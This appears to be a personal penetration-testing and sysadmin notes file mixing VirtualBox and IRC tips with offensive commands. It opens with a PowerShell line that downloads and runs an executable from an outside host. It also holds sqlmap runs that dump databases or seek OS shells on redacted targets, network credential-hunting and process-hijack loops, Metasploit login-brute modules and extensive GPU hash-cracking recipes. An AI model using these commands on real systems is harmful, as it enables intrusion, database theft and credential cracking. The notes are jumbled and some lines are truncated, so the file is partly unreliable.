            powershell (new-object System.Net.WebClient).DownloadFile('http://rmccurdy.com/scripts/quickvnc.exe','%TEMP%\quickvnc.exe');Start-Process "%TEMP%\quickvnc.exe"
            
            
            

NX client FreeNX
-------------------


line to use in custom for ubuntu
-------------------

            gnome-session --session=ubuntu-2d
            
            
            # stupid webalizer ...
             find /var/log/apache2/access.log* -exec webalizer -c /etc/webalizer/webalizer.conf '{}'  \;
            
            

wipe irssi conf and setup
-------------------

            rm -Rf ~./.irssi
            /NETWORK ADD  synirc 
            /SERVER ADD -auto -network synirc irc.synirc.net 6667 
            /CHANNEL ADD -auto #newznab synirc 
            /SET autolog ON
            /SET autolog_level ALL
            
            
            /alias hideadd eval set activity_hide_targets $activity_hide_targets $-
            /alias hideclear set -c activity_hide_targets
            /alias hidelevels.clear set -c activity_hide_level
            /alias hidelevels.set set activity_hide_level parts joins quits nicks modes
            /alias hidelist set activity_hide_targets
            /alias hideset set activity_hide_targets $-
            
            /hideadd 
            /hideclear 
            /hidelevels.clear 
            /hidelevels.set 
            /hidelist 
            /hideset 
            /ignore -channels #newznab * JOINS PARTS QUITS NICKS
            
            
            
            

virtualbox vbox headless vbs script
-------------------

            Set WshShell = WScript.CreateObject("WScript.Shell")
            obj = WshShell.Run("C:\Progra~1\Oracle\VirtualBox\VBoxHeadless.exe -s nnplus64", 0)
            set WshShell = Nothing
            
            

compress dynamic disk in virtualbox
-------------------

            dd if=/dev/zero of=/zerofile; sudo rm /zerofile
            dd if=/dev/zero of=/zerofile; sudo rm /zerofile
            VBoxManage  modifyhd  nnplus2.vdi -compact 
            
            
            

start vbox vm
-------------------

            VBoxHeadless  -s nnplus 
            
            # start a vm hidden/headless
            powershell start-process 'C:\Program Files\Oracle\VirtualBox\vboxheadless' '-s nnplus64' -WindowStyle Hidden
            
            

wipe snapshot
-------------------

            VBoxManage snapshot nnplus take clean
            

shutdown via cmd
-------------------

            VBoxManage controlvm "nnplus" powerof
            
            

backup conf files quickly before update
-------------------

            locate "*.conf"|xargs tar -zcpf "/home/mythtv/CONF_ZIP_`date +%Y%m%d`.tar.gz"
            
            IP to Site
            http://www.ip866.com/reverse.aspx
            http://www.myipneighbors.com
            http://www.yougetsignal.com/tools/web-sites-on-web-server
            http://ip.wen.la
            http://www.114best.com/ip/
            http://www.zzstat.com/ip_domain.html
            http://whois.webhosting.info
            http://www.bm8.com.cn/myip
            http://www.seores.com/search/checkdomainfromip.asp
            http://tools.dxsheng.com/IpSnap
            http://tool.gimoo.net/iphost
            http://www.yw123.com/ip.asp
            http://cn.bing.com/search?q=ip%3A209.195.132.165
            http://www.ip138.com+
            
            hashs
            href="http://hashcrack.com
            http://www.lmcrack.com
            http://passcracking.com
            http://www.cmd5.com
            http://xmd5.org
            http://md5.rednoize.com
            http://www.t00ls.net/tools/md5
            http://www.hashchecker.com/index.php?_sls=search_hash
            http://md5.mmkey.com
            http://gdataonline.com/seekhash.php">GdataOnline</a><br>
            http://cha88.cn/safe/md5.php
            http://www.md5crack.com
            http://www.md5.com.cn
            http://www.objectif-securite.ch/en/products.php
            
            #db  ports ?
            -T3 -p 1521-1527,3306-3310,1433-1437,3200-3299,3300-3399,32000-32990,33000-33990
            
            # mount images also checck sleuthkit.org/autopsy/
            First I check the disk geometry with sfdisk -l -u -S *
            Then  look for the start sector of the partition, e.g. 5
            
            mount -o loop,offset=$((5 * 512)) [image] /mnt
            mount the partition to /mnt (replace 5 with the output from sfdisk)
            
            mount -t ntfs -o ro,offset=32256,loop,umask=007,gid=4 /media/IOMEGA_BKUP/CLIENT-MX/APPSERVER.dd appserver/
            
            mount -t ntfs -o ro,offset=41126400,loop,umask=007,gid=4 /media/IOMEGA_BKUP/CLIENT-MX/RH-CLIENT-MX.dd rh-CLIENT-MX/part1/
            mount -t ntfs -o ro,offset=12930172416,loop,umask=007,gid=4 /media/IOMEGA_BKUP/CLIENT-MX/RH-CLIENT-MX.dd rh-CLIENT-MX/part2/
            
            mount -t ntfs -o ro,offset=32256,loop,umask=007,gid=4 /media/IOMEGA_BKUP/CLIENT-MX/SERVERSQL.dd serversql
            mount -t ntfs -o ro,offset=32256,loop,umask=007,gid=4 /media/IOMEGA_BKUP/CLIENT-MX/SERVERSQL2.dd serversql2/
            
            
            
            # nethackit.sh.txt metasploit scanners
            auxiliary/scanner/ftp/anonymous
            auxiliary/scanner/ftp/ftp_login
            auxiliary/scanner/snmp/snmp_enum
            auxiliary/scanner/snmp/snmp_enumshares
            auxiliary/scanner/snmp/snmp_enumusers
            auxiliary/scanner/snmp/snmp_login
            auxiliary/scanner/mssql/mssql_hashdump
            auxiliary/scanner/oracle/oracle_login
            auxiliary/scanner/oracle/sid_brute
            auxiliary/scanner/smtp/smtp_enum
            auxiliary/scanner/smtp/smtp_version
            auxiliary/scanner/telnet/telnet_login
            auxiliary/scanner/mysql/mysql_hashdump
            auxiliary/scanner/mysql/mysql_login
            auxiliary/scanner/mysql/mysql_version
            auxiliary/scanner/smb/smb_version
            auxiliary/scanner/smb/smb_enumusers
            auxiliary/scanner/smb/smb_login
            auxiliary/scanner/smb/smb_enumshares
            auxiliary/scanner/nfs/nfsmount
            auxiliary/scanner/vnc/vnc_login
            auxiliary/scanner/vnc/vnc_none_auth
            auxiliary/scanner/pop3/pop3_version
            auxiliary/scanner/pop3/pop3_login
            auxiliary/scanner/http/http_login
            auxiliary/scanner/http/dir_scanner
            auxiliary/scanner/http/dir_scanner
            auxiliary/scanner/http/http_version
            auxiliary/scanner/http/robots_txt
            auxiliary/scanner/http/apache_userdir_enum
            auxiliary/scanner/http/blind_sql_query
            auxiliary/scanner/http/cisco_ios_auth_bypass
            auxiliary/scanner/http/error_sql_injection
            auxiliary/scanner/http/files_dir
            auxiliary/scanner/http/jboss_vulnscan
            auxiliary/scanner/http/web_vulndb
            auxiliary/scanner/ssh/ssh_login
            auxiliary/scanner/ssh/ssh_login_pubkey
            auxiliary/scanner/ssh/ssh_version
            auxiliary/scanner/sip/enumerator
            auxiliary/scanner/sip/enumerator_tcp
            auxiliary/scanner/sip/sipdroid_ext_enum
            

grep password words in a file and shot 4 lines before and after grep images AIX images 
-------------------

            egrep -A 4 -B 4 -ia '(passwd|password|shadow)' someAIX_NIM_DUMP.image.110512 > out.txt
            # perform strings on the output so we can read it ..
            strings out.txt > out2.txt
            
            
            # Oracle 7-10g DES(ORACLE) Oclhashcat_plus GPU
            # input :   F35C90763516369B:DEV_MDS
            cudaHashcat-plus64.exe --hash-type 3100 C:\egb\ocl\ORACLE.txt C:\egb\Dictionaries\PasswordsPro.dic C:\egb\Dictionaries\Xploitz_clean.lst
            
            #oracle dump ref defcon-17-chris_gates-breaking_metasploit.pdf and win32exec.rb in MSF
            select owner, table_name, column_name,data_type,data_length, data_precision,data_default, avg_col_len, char_length from sys.dba_tab_columns where owner not in ('APPQOSSYS','ADUSER','CTXSYS','DIP','DBSNMP','MDSYS','OUTLN','SYS','SYSTEM','TEST','XDB','WMSYS','XSNULL') AND avg_col_len>0
            
            # oracle
            nmap -n --script=oracle-sid-brute -p 1521-1560 -iL oracle -A 
            
            # mount smb share with runas/savecred ... yes this is bad idea! 
            runas /u:admin /savecred "net use Z: \\192.168.1.151\myth\h /del"
            runas /u:admin /savecred "net use \\192.168.1.151\myth\h /del"
            runas /u:admin /savecred "net use z: \\192.168.1.151\myth\h /user:mythtv PASSSWORDHERE"
            
            
            
            
            Use takeown to take ownership of the file
            takeown /r /d y /f * 
            Follow it up with icacls set the access control list 
            icacls * /t  /grant Everyone:F
            
            
            #So it appears Google translator blocks English to English translating ( aka super fast web proxy ).  So guess what ? Just change the source language it to valid English language code like en-au 
            
            http://translate.google.com/translate?sl=af&tl=en-au&js=n&prev=_t&hl=en&ie=UTF-8&layout=2&eotf=1&u=http%3A%2F%2Frmccurdy.com
            
            
            
            #gawk awk system exec commands with output of awk
            /rmccurdy/scripts/web_dump.sh:echo $i|sed 's/,/ /g' | gawk '{system ("curl -k --location-trusted -m 3 -L -o " $1"_"$2".html https:\/\/"$1":"$2 )}' 2>&1  &
            /rmccurdy/scripts/web_dump.sh:echo $i|sed 's/,/ /g' | gawk '{system ("curl -k --location-trusted -m 3 -L -o " $1"_"$2".html http:\/\/"$1":"$2 )}' 2>&1  &
            
            # filename= in header
            curl -O -J -L URL
            
            
            #Nmap Idle Scanning. 
            use auxiliary/scanner/ip/ipidseq
            nmap  192.168.1.250 -top-ports 9 -D RND:120 -T4 -ff 
            
            # wmic fu search systems for running 'exe' to hijack 
            FOR /F "delims==" %%A IN ('type ips.txt') DO  wmic /Node:%%A wmic /user:username /password:yourpassword /FAILFAST:ON process where "name like '%.exe'" call  getowner
            

wmic fu to dump VPN event logs cisco
-------------------

            wmic nteventlog where filename='cisco anyconnect vpn client' backupeventlog %USERPROFILE%\desktop\Cisco_AnyConnect_VPN_CLient_%USERNAME%_%COMPUTERNAME%.evt
            
            
            Netsess.exe .h 
            
            FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>nul > sessions.txt &&
            FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a
            
            FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt &&
            FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process 
            
            on %i && pause
            
            for /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL >nbsessions.txt && FOR /F %n in 
            
            (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
            
            for /F %i in (ips.txt) do @echo [+] Checking %i && nbtscan -f %i 2>NUL >nbsessions.txt && FOR /F %n in 
            
            (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
            
            
            #uwall.tv direct link
            http://uwall.tv/player_lightbox.php?q=gangnam%20style
            
            # cat /bin/RAND 
            IFS=$'\n'
            
            for fname in `find . -type f `
            do
               mv "$fname" $RANDOM$RANDOM
            done
            
            
            
            # burp in win7 etc ..
            run as administrator
            Solution was to add the "-Djava.net.preferIPv4Stack=true" flag, so the following entry in my .bat file works now:
            
            # John the Ripper Password Cracker (Fast Mode)
            # see also :
            # 
            # auxiliary/analyze/jtr_aix
            # auxiliary/analyze/jtr_linux
            # auxiliary/analyze/jtr_mssql_fast
            # auxiliary/analyze/jtr_mysql_fast
            # auxiliary/analyze/jtr_oracle_fast
            # auxiliary/analyze/jtr_unshadow
            # auxiliary/analyze/postgres_md5_crack
            
            
            use auxiliary/analyze/jtr_crack_fast
            set Munge 0
            run# got new ebooks with roubble \n\n or \r\r 
            For converting double newlines (\n\n) to a single newline (\n):
            sed -e 'N;P;s/\n$//;D'
            
            For converting double carriage returns (\r\r) to a single carriage
            return (\r):
            sed -e 's/\r\r/\r/g'
            
            tr(1) has the -s option, but that will squeeze multiple (possibly more
            than two) occurrences to a single occurrence.
            
            This can also be handled in the more general case with perl(1), e.g.:
            perl -pe '
            BEGIN {$/="\n\n";}
            s/\n\n/\n/o;
            
            john 1337 speak worlist gen:
            
            
            
            The default john.conf includes some rules like that, enabled for "single crack" mode only by default. You may copy the lines between these two comments:
            # The following 3l33t rules are based on original Crack's dicts.rules
            l/asa4[:c]
            l/ese3[:c]
            l/lsl1[:c]
            l/oso0[:c]
            l/sss$[:c]
            ...
            l/asa4/ese3/lsl1/oso0/sss$[:c]
            # Now to the prefix stuff...
            into the [List.Rules:Wordlist] section to have them enabled for wordlist mode as well. usage: john -w=wordlist --stdout --rules
            
            
            # slow this or run it over proxychains etc ..
            for i in `cat in` ;do python metagoofil.py -d $i -l 100 -f all -o micro_$i.html -t micro-files_$i;sleep 60;done
            for i in `cat in` ;do ./theHarvester.py -d $i -b google;sleep 60;done
            
            

hybrid mask attack hashcat  not all special characters
-------------------

            ?u?l?d!@#$-().*_
            

grep 8 or more char long characterslength
-------------------

            grep '[^\ ]\{8,\}'

sed 8 chars long characters long length
-------------------

            sed -n -e '/^.\{8\}$/p'' 
            
            
            # fix path Environment Variables path issues in M$
            sysdm.cpl
            C:\Program Files\w3af;C:\Program Files;C:\winxp;C:\winxp\System32;c:\program files\nmap;C:\Program Files\RSA SecurID Token Common;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;C:\Strawberry\c\bin;C:\Strawberry\perl\site\bin;C:\Strawberry\perl\bin
            
            

nmap SMB check unsafe 
-------------------

            nmap  --script smb-check-vulns.nse --script-args=unsafe=1 -p445 192.168.1.0/24 --open
            

 openvas cioent
-------------------


Update your distro
-------------------

            apt-get update && apt-get dist-upgrade
            
            # Install openvas server and client software + security plugins
            apt-get install openvas-server openvas-client \
               openvas-plugins-base openvas-plugins-dfsg
            
            # Update the vuln. database
            openvas-nvt-sync
            
            Add a user that you're going to use from the client, to login:
            
            openvas-adduser
            
            Here, you'll add a user/pass combination. 
            
            When prompted to add a 'rule' - I allow my user to do everything. The rules allow/disallow scanning of hosts. If you want you can let bob scan 192.168.0.0/24 or whatever. I want my user to scan all, so when prompted, simply enter 
            
            default accept
            
            Now, fire up the server. Note that the first time you run, it loads all those checks into memory so it takes a LONG time for the server to actually start.
            
            /etc/init.d/openvas-server start
            
            Now, you can start scanning. Create a file with IP's and/or hostnames that your client will feed to the server to scan. Something like this:
            
            192.168.1.5
            www.mydomain.com
            dns.mydomain.com
            10.1.19.0/24
            
            etc.
            
            The server listens on port: 9390 by default so you'll want to tell your client to connect there. Once you have the file created, you can kick off your scan like this:
            
            OpenVAS-Client -q 127.0.0.1 9390 admin scanme.txt -T html \
                 ~/Desktop/openvas-output-`date`.html 
            
            You'll be prompted to accept the SSL certificate, go ahead, it's automagically created by the pkg when it's installed. Then, open that file in a browser when it's done and start going through it. Be warned, scanning is very hostile so you should really only scan your own systems.. and those of your enemies.
            
            
            # sqlmap notes .. also check out Havij 1.15 - Advanced SQL Injection 
            
            --wizard
            --search -C pass,pwd,ssn
            
            
            /pentest/database/sqlmap/sqlmap.py -u "https://tZZZZZZ.com/ZZZZZ/Default.aspx" --data="__VIEWSTATE=%ZZZZZZZZ&btnContinue=Continue" --os-pwn --msf-path /pentest/exploits/framework
            
            /pentest/database/sqlmap/sqlmap.py -u "http://ZZZZ4/forgotpass.aspx" --data="__VIEWSTATE=%2FZZZZZZ&email=a&submit=Password" --dump-all --exclude-sysdbs
            
            

for use with burpsuite and NTLM stop and threads also good stuff
-------------------

            /bin/python2.7.exe sqlmap.py  --start=1 --stop=10 --threads=10  -p Batch_dt --dbms=mssql --proxy="http://localhost:8080" -u 'http://yaySQLI?Batch_dt=8%2f12%2f2015&Batch_nbr=1&Loc=MOB'  --dump-all --exclude-sysdbs
            
            
            
            #oclHashcat plus Support List :
            
            # scripts !
            http://itsecblog.net/downloads/batchcrack.sh
            http://rmccurdy.com/scripts/batchcrack_rmccurdy.bat
            
            number 	PSA 	hashcat (0.39b24) 	oclHashcat-plus (0.08b25) 	oclHashcat-lite (0.10b9)
            0 	MD5 	x 	x 	x
            1 	*md5($pass.$salt) (see 11) 	x 		
            2 	*md5($salt.$pass) (see 21) 	x 		
            3 	*md5(md5($pass)) (see 2600) 	x 		
            4 	*md5(md5(md5($pass))) 	x 		
            5 	*vBulletin < v3.8.5 (see 2611) 	x 		
            6 	*md5(md5($salt).$pass) (see 2811) 	x 		
            7 	*md5($salt.md5($pass)) 	x 		
            8 	*md5($salt.$pass.$salt) 	x 		
            9 	*md5(md5($salt).md5($pass)) 	x 		
            10 	*md5(md5($pass).md5($salt)) 	x 		x
            11 	*md5($salt.md5($salt.$pass)) 	x 		
            11 	Joomla 		x 	x
            12 	*md5($salt.md5($pass.$salt)) 	x 		
            15 	*vBulletin > v3.8.5 (see 2711) 	x 		
            21 	osCommerce, xt:Commerce 		x 	
            30 	*md5($username.0.$pass) 	x 		
            31 	*md5(strtoupper(md5($pass))) 	x 		
            100 	SHA1 	x 	x 	x
            101 	nsldap, SHA-1(Base64), Netscape LDAP SHA 		x 	x
            101 	*sha1($pass.$salt) 	x 		
            102 	*sha1($salt.$pass) 	x 		
            103 	*sha1(sha1($pass)) 	x 		
            104 	*sha1(sha1(sha1($pass))) 	x 		
            105 	*sha1(strtolower($username).$pass) (see 121) 	x 		
            110 	*sha1($pass.$salt) 			x
            111 	nsldaps, SSHA-1(Base64), Netscape LDAP SSHA 		x 	x
            112 	Oracle 11g 		x 	x
            121 	SMF > v1.1 		x 	
            122 	OSX v10.4, v10.5, v10.6 		x 	
            131 	MSSQL(2000) 		x 	x
            132 	MSSQL(2005) 		x 	x
            200 	MySQL323 	x 		
            300 	MySQL >=4.1	x 	x 	x
            400 	phpass, MD5(Wordpress), MD5(phpBB3) 	x 	x 	
            500 	md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 	x 	x 	
            600 	*SHA-1(Base64) (see 101) 	x 		
            700 	*SSHA-1(Base64) (see 111) 	x 		
            800 	SHA-1(Django) 	x 		
            900 	MD4 	x 	x 	x
            1000 	NTLM 	x 	x 	x
            1100 	Domain Cached Credentials, mscash 	x 	x 	x
            1200 	MD5(Chap) 	x 		
            1300 	MSSQL 	x 		
            1400 	SHA256 	x 	x 	x
            1500 	descrypt, DES(Unix), Traditional DES 		x 	x
            1600 	md5apr1, MD5(APR), Apache MD5 	x 	x 	
            1700 	SHA512 	x 		x
            1800 	SHA-512(Unix) 	x 		
            1900 	SL3 			x
            2100 	Domain Cached Credentials2, mscash2 		x 	
            2400 	Cisco-PIX MD5 		x 	x
            2500 	WPA/WPA2 		x 	
            2600 	Double MD5 		x 	x
            2611 	vBulletin < v3.8.5 		x 	x
            2711 	vBulletin > v3.8.5 		x 	x
            2811 	IPB2+, MyBB1.2+ 		x 	x
            3000 	LM 		x 	x
            
                *
                  * Depreached,
            
            
            Example :
            set BIN=oclHashcat-plus64
            set OPTS=--attack-mode 3 --gpu-accel 160 --gpu-loops 1024 --gpu-watchdog 0 --runtime 30 --force --custom-charset1 ?l?d?s?u
             
            %BIN% %OPTS% --hash-type 0 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type   11 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type   21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  100 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  101 {SHA}aaaaaaaaaaaaaaaaaaaaaaaaaaQ= ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  111 {SSHA}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaQ== ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  112 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  121 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:a ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  122 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  131 0x0100aaaaaaaa0000000000000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  132 0x0100aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  300 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  400 $H$9aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1 ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type  500 $1$aaaaaaaa$aaaaaaaaaaaaaaaaaaaaa1 ?1?1?1?1?1?1?1?1 --gpu-loops 1000
            %BIN% %OPTS% --hash-type  900 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 1000 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 1100 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:a ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 1400 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 1500 aaaaaaaaaaaaw ?1?1?1?1?1?1?1?1 --gpu-accel 80
            %BIN% %OPTS% --hash-type 1600 $apr1$aaaaaaaa$aaaaaaaaaaaaaaaaaaaaa1 ?1?1?1?1?1?1?1?1 --gpu-loops 1000
            %BIN% %OPTS% --hash-type 2100 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:a ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 2400 aaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 2500 test.hccap ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 2611 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 2711 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ?1?1?1?1?1?1?1?1
            %BIN% %OPTS% --hash-type 2811 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:aaaaa ?1?1?1?1?1?1?1?1
            sq
            
            # ocl hashcat plus examples:
            
            
            
            all Rule based attack:
            FOR /F "delims==" %%A IN ('DIR/B/S ".\rules\"') DO cudaHashcat-plus32.exe -a 0 -r  "%%A"  -m1100 -o out.txt  "mscache2" "C:\egb\Dictionaries\rockyou.txt"
            
            
            
            
            
            rem example brute by char to 7 max chars in ~5min  with GTX 560 example hash '2d9f0b052932ad18b87f315641921cda:user' password is password ...
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1?1
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1?1?1
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1?1?1?1
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1?1?1?1?1
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1?1?1?1?1?1
            
            
            rem example Hybrid attack rockyou.txt wordlist+MASK to 4 chars 
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?l?u?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\rockyou.txt" "?1"
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?l?u?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\rockyou.txt" "?1?1"
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?l?u?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\rockyou.txt" "?1?1?1"
            
            
            rem same as above with 1337 speek wordlist+MASK  to 4 chars 
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?l?u?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\1337_speak.txt" "?1"
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?l?u?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\1337_speak.txt" "?1?1"
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?l?u?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\1337_speak.txt" "?1?1?1"
            
            rem example Hybrid attack rockyou.txt wordlist+MASK to 4 chars digi and some special chars only ... 
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\rockyou.txt" "?1?1?1"
            
            rem example Hybrid attack 1337 speekt wordlist+MASK to 4 chars digi and some special chars only ... 
            cudaHashcat-plus32.exe -o out.txt -a6 -1 "?d!@#$-().*_" -m1100  "mscache2" "C:\egb\Dictionaries\1337_speak.txt" "?1?1?1"
            
             
            
            
            rem dammit I give up ... 6hrs .. for 7char brute 
            cudaHashcat-plus32.exe -o out.txt -a3 -1 "?l?u?d!@#$-().*_" -m1100 mscache2 ?1?1?1?1?1?1?1
              
            
            REM really !?!? example 8 char brute ( 18 days on GTX 560 )
            cudaHashcat-plus32.exe -o out.txt -a3 -1 ?l?u?d!@#$-().*_ -m1100 mscache2 ?1?1?1?1?1?1?1?1
            
            eneric hash types:		
            Hash-Mode 	Hash-Name 	Example
            0	MD5 	8743b52063cd84097a65d1633f5c74f5
            10	md5($pass.$salt) 	01dfae6e5d4d90d9892622325959afbe:7050461
            20	md5($salt.$pass) 	f0fda58630310a6dd91a7d8f0a4ceda2:4225637426
            30	md5(unicode($pass).$salt) 	b31d032cfdcf47a399990a71e43c5d2a:144816
            40	md5($salt.unicode($pass)) 	d63d0e21fdc05f618d55ef306c54af82:13288442151473
            50	HMAC-MD5 (key = $pass) 	fc741db0a2968c39d9c2a5cc75b05370:1234
            60	HMAC-MD5 (key = $salt) 	bfd280436f45fa38eaacac3b00518f29:1234
            100	SHA1 	b89eaac7e61417341b710b727768294d0e6a277b
            110	sha1($pass.$salt) 	2fc5a684737ce1bf7b3b239df432416e0dd07357:2014
            120	sha1($salt.$pass) 	cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024
            130	sha1(unicode($pass).$salt) 	c57f6ac1b71f45a07dbd91a59fa47c23abcd87c2:631225
            140	sha1($salt.unicode($pass)) 	5db61e4cd8776c7969cfd62456da639a4c87683a:8763434884872
            150	HMAC-SHA1 (key = $pass) 	c898896f3f70f61bc3fb19bef222aa860e5ea717:1234
            160	HMAC-SHA1 (key = $salt) 	d89c92b4400b15c39e462a8caa939ab40c3aeeea:1234
            190	sha1(LinkedIn) 	b89eaac7e61417341b710b727768294d0e6a277b
            200	MySQL323 	7196759210defdc0
            300	MySQL4.1/MySQL5+ 	FCF7C1B8749CF99D88E5F34271D636178FB5D130
            400	phpass, MD5(Wordpress),	
            MD5(Joomla) 	$P$984478476IagS59wHZvyQMArzfx58u.	
            400	phpass, MD5(phpBB3) 	$H$984478476IagS59wHZvyQMArzfx58u.
            500	md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 2 	$1$28772684$iEwNOgGugqO9.bIz5sk8k/
            800	SHA-1(Django) 	sha1$$b89eaac7e61417341b710b727768294d0e6a277b
            900	MD4 	afe04867ec7a3845145579a95f72eca7
            1000	NTLM 	b4b9b02e6f09a9bd760f388b67351e2b
            1100	Domain Cached Credentials, mscash 	4dd8965d1d476fa0d026722989a6b772:3060147285011
            1400	SHA256 	127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935
            1410	sha256($pass.$salt) 	c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4:53743528
            1420	sha256($salt.$pass) 	eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617
            1430	sha256(unicode($pass).$salt) 	4cc8eb60476c33edac52b5a7548c2c50ef0f9e31ce656c6f4b213f901bc87421:890128
            1440	sha256($salt.unicode($pass)) 	a4bd99e1e0aba51814e81388badb23ecc560312c4324b2018ea76393ea1caca9:12345678
            1450	HMAC-SHA256 (key = $pass) 	abaf88d66bf2334a4a8b207cc61a96fb46c3e38e882e6f6f886742f688b8588c:1234
            1460	HMAC-SHA256 (key = $salt) 	8efbef4cec28f228fa948daaf4893ac3638fbae81358ff9020be1d7a9a509fc6:1234
            1500	descrypt, DES(Unix), Traditional DES 	48c/R8JAv757A
            1600	md5apr1, MD5(APR), Apache MD5 2 	$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.
            1700	SHA512 	82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f
            1710	sha512($pass.$salt) 	e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd:6352283260
            1720	sha512($salt.$pass) 	976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a:2613516180127
            1730	sha512(unicode($pass).$salt) 	13070359002b6fbb3d28e50fba55efcf3d7cc115fe6e3f6c98bf0e3210f1c6923427a1e1a3b214c1de92c467683f6466727ba3a51684022be5cc2ffcb78457d2:341351589
            1740	sha512($salt.unicode($pass)) 	bae3a3358b3459c761a3ed40d34022f0609a02d90a0d7274610b16147e58ece00cd849a0bd5cf6a92ee5eb5687075b4e754324dfa70deca6993a85b2ca865bc8:1237015423
